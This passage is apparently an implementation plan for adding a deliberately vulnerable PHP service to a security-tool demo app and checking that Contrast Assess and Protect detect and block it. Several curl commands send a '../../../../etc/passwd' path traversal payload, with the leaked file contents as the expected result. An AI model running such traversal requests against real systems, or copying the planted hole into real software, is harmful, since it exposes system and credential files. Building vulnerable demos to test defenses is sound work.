curl 'http://app.localhost/api/tracking-report/download?file=../../../../etc/passwd'
```

With Contrast Protect **disabled**, returns the contents of `/etc/passwd`.
With Contrast Protect **enabled**, the agent blocks the request.

### Expected Contrast detections

- **Assess (IAST):** Path Traversal finding with the data-flow trace from the Symfony `Request::query->get` source through the string concatenation to the `file_get_contents` sink.
- **Protect (RASP):** Path Traversal Protect rule blocks the request when the resolved path escapes the intended base directory.
```

- [ ] **Step 2: Commit**

```bash
git add vulnerabilities.md
git commit -m "$(cat <<'EOF'
docs: document Path Traversal vulnerability in trackingreportservice

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 6: End-to-end manual verification

**Files:** none (verification only)

- [ ] **Step 1: Deploy**

Run: `make deploy`
Expected: All pods reach Ready, including `trackingreportservice`. The deploy command also prints a Contrast URL.

If deployment fails, read logs and fix the underlying issue. Do **not** force or `--no-verify` anything.

- [ ] **Step 2: Verify the PHP service is healthy**

Run: `kubectl get pods -l app=trackingreportservice`
Expected: STATUS = `Running`, READY = `1/1`.

Run: `kubectl logs deploy/trackingreportservice | grep -i contrast | head`
Expected: Contrast PHP agent startup log lines visible.

- [ ] **Step 3: Verify the seeded files exist**

Run: `kubectl exec deploy/trackingreportservice -- ls /var/www/var/reports/exports/`
Expected: Five files: `TRACK-A1B2C3D4.txt`, `TRACK-E5F6G7H8.txt`, `TRACK-I9J0K1L2.txt`, `TRACK-M3N4O5P6.txt`, `TRACK-Q7R8S9T0.txt`.

- [ ] **Step 4: Verify normal download path works through frontgate**

Log in to obtain a session cookie (the simulation console's traffic generator does this for you; for manual curl-only verification, you'll need to mimic the login flow or hit the service via the simulation console UI). Once authenticated, run:

```bash
curl -b cookies.txt 'http://app.localhost/api/tracking-report/download?file=TRACK-A1B2C3D4.txt'
```

Expected: HTTP 200, body starts with `CARGO CATS - TRACKING REPORT`.

Alternative end-to-end smoke test using the console UI:
1. Open `http://console.localhost`.
2. Click the "Normal Traffic" button and let it run to completion.
3. Confirm the log output shows `Tracking report download (TRACK-*.txt) - Status: 200`.

- [ ] **Step 5: Verify exploit with Protect disabled**

Confirm Protect is disabled for the `trackingreportservice` application in the Contrast UI (this is the default unless you've enabled it). Run the exploit:

```bash
curl -b cookies.txt 'http://app.localhost/api/tracking-report/download?file=../../../../etc/passwd'
```

Expected: HTTP 200, body contains `root:x:0:0:`.

Or use the console UI:
1. Click the "Path Traversal" individual-exploit button.
2. Confirm log output includes `SUCCESS: Path Traversal returned /etc/passwd contents`.

- [ ] **Step 6: Verify Assess detection in Contrast UI**

Open the Contrast Assess UI (URL printed by `make deploy`). Navigate to the application `<your-uniq-name>-cargocats-trackingreportservice`. Expected: a Path Traversal vulnerability with a stack trace pointing to `TrackingReportController::downloadReport`. The data-flow trace should show the source (`Request::query->get`) and the sink (`file_get_contents`).

- [ ] **Step 7: Verify Protect block (enable Protect for this application)**

Enable Protect mode on the `trackingreportservice` application in the Contrast UI (Protection mode → Block). Wait ~30 seconds for the policy to propagate, or restart the pod:

```bash
kubectl rollout restart deploy/trackingreportservice
kubectl rollout status deploy/trackingreportservice
```

Re-run the exploit:

```bash
curl -b cookies.txt -i 'http://app.localhost/api/tracking-report/download?file=../../../../etc/passwd'
```

Expected: HTTP 403 (or other non-200 indicating block). Body does **not** contain `/etc/passwd` contents.

In the Contrast UI, an Attack event with rule `path-traversal` should appear under the application's Attacks tab.

- [ ] **Step 8: Final smoke test — clean console UI run**

With Protect re-disabled (to keep the demo flow clean), in the console UI:
1. Run "Normal Traffic" — confirm no Attacks recorded.
2. Run "Run All Exploits" — confirm Path Traversal appears in the orchestrated chain and reports SUCCESS.

- [ ] **Step 9: Spot-check the diagram renders**

Open `README.md` on GitHub (or push to a topic branch first if not yet remote) and confirm the mermaid diagram renders the new `trackingreportservice` node with the right color class and edge.

- [ ] **Step 10: No commit needed** — verification only. Stop here unless issues found.

If any verification step fails, return to the failing task, fix, and re-verify. Do not paper over Assess/Protect failures by tweaking the exploit until it "looks right" — investigate root cause.

---

## Out of scope (explicitly)

- Adding a new vulnerability type other than Path Traversal.
- PDF/HTML report generation. Plain text files are sufficient.
- Automated tests / CI. Repository has none for any service.
- Renaming the PHP service or its endpoints.
- Cleaning up unrelated whitespace churn from the existing branch.
